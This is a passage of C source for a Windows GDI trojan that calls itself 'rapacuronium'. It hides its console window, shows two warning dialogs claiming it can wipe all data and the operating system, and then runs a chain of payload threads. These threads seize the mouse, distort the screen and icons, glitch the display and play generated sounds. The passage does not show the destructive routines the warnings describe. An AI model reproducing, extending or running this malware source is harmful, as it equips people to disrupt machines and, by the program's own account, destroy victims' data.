	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
void mainpayloads() {
	CreateThread(0, 0, fe, 0, 0, 0);
	Sleep(5000);
	HANDLE thread0 = CreateThread(0, 0, mousecrazy, 0, 0, 0);
	Sleep(5000);
	HANDLE thread00 = CreateThread(0, 0, fecopy, 0, 0, 0);
	Sleep(100);
	HANDLE thread000 = CreateThread(0, 0, idkline, 0, 0, 0);
	Sleep(100);
	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	sound1();
	TerminateThread(thread1, 0);
	refreshscr();
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	sound2();
	TerminateThread(thread2, 0);
	refreshscr();
	HANDLE thread3_num1 = CreateThread(0, 0, rgb, 0, 0, 0);
	HANDLE thread3_num2 = CreateThread(0, 0, graphic_all, 0, 0, 0);
	HANDLE thread3_num3 = CreateThread(0, 0, idkicon, 0, 0, 0);
	sound3();
	TerminateThread(thread3_num1, 0);
	TerminateThread(thread3_num2, 0);
	refreshscr();
	HANDLE thread4_num1 = CreateThread(0, 0, stretchblt, 0, 0, 0);
	HANDLE thread4_num2 = CreateThread(0, 0, squcol, 0, 0, 0);
	sound4();
	TerminateThread(thread4_num1, 0);
	TerminateThread(thread4_num2, 0);
	refreshscr();
	HANDLE thread5 = CreateThread(0, 0, sierpinski, 0, 0, 0);
	sound5();
	TerminateThread(thread5, 0);
	refreshscr();
	HANDLE thread6 = CreateThread(0, 0, drawbytebeat, 0, 0, 0);
	sound6();
	TerminateThread(thread6, 0);
	refreshscr();
	HANDLE thread7_num1 = CreateThread(0, 0, scrcrazymove, 0, 0, 0);
	HANDLE thread7_num2 = CreateThread(0, 0, text, 0, 0, 0);
	sound7();
	TerminateThread(thread7_num1, 0);
	TerminateThread(thread3_num3, 0);
	refreshscr();
	HANDLE thread8_num1 = CreateThread(0, 0, iconcrazy_num1, 0, 0, 0);
	HANDLE thread8_num2 = CreateThread(0, 0, iconcrazy_num2, 0, 0, 0);
	HANDLE thread8_num3 = CreateThread(0, 0, iconcrazy_num3, 0, 0, 0);
	HANDLE thread8_num4 = CreateThread(0, 0, iconcrazy_num4, 0, 0, 0);
	HANDLE thread8_num5 = CreateThread(0, 0, iconcrazy_num5, 0, 0, 0);
	sound8();
	TerminateThread(thread8_num1, 0);
	TerminateThread(thread8_num2, 0);
	TerminateThread(thread8_num3, 0);
	TerminateThread(thread8_num4, 0);
	TerminateThread(thread8_num5, 0);
	refreshscr();
	HANDLE thread9 = CreateThread(0, 0, shader3, 0, 0, 0);
	sound9();
	TerminateThread(thread9, 0);
	TerminateThread(thread7_num2, 0);
	refreshscr();
	HANDLE thread10 = CreateThread(0, 0, shader4, 0, 0, 0);
	sound10();
	TerminateThread(thread10, 0);
	refreshscr();
	HANDLE thread11 = CreateThread(0, 0, shader5, 0, 0, 0);
	sound11();
	TerminateThread(thread11, 0);
	refreshscr();
	HANDLE thread12 = CreateThread(0, 0, shader6, 0, 0, 0);
	sound12();
	TerminateThread(thread12, 0);
	refreshscr();
	HANDLE thread13 = CreateThread(0, 0, shader7, 0, 0, 0);
	sound13();
	TerminateThread(thread13, 0);
	refreshscr();
	HANDLE thread14_num1 = CreateThread(0, 0, shader8, 0, 0, 0);
	sound14();
	Sleep(30000);
	TerminateThread(thread14_num1, 0);
	refreshscr();
	HANDLE thread14_num2 = CreateThread(0, 0, profect, 0, 0, 0);
	Sleep(30000);
	TerminateThread(thread14_num2, 0);
	refreshscr();
	HANDLE thread15_num1 = CreateThread(0, 0, sharpen, 0, 0, 0);
	HANDLE thread15_num2 = CreateThread(0, 0, glitch, 0, 0, 0);
	sound15();
	TerminateThread(thread15_num1, 0);
	TerminateThread(thread15_num2, 0);
	refreshscr();
	TerminateThread(thread0, 0);
	TerminateThread(thread00, 0);
	TerminateThread(thread000, 0);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	Seedxorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookcopy = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as rapacuronium that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"rapacuronium", MB_YESNO | MB_ICONWARNING) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookcopy);
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"rapacuronium", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookcopy);
			ExitProcess(0);
		}
		else
		{
			mainpayloads();
		}
	}
	return 0;
}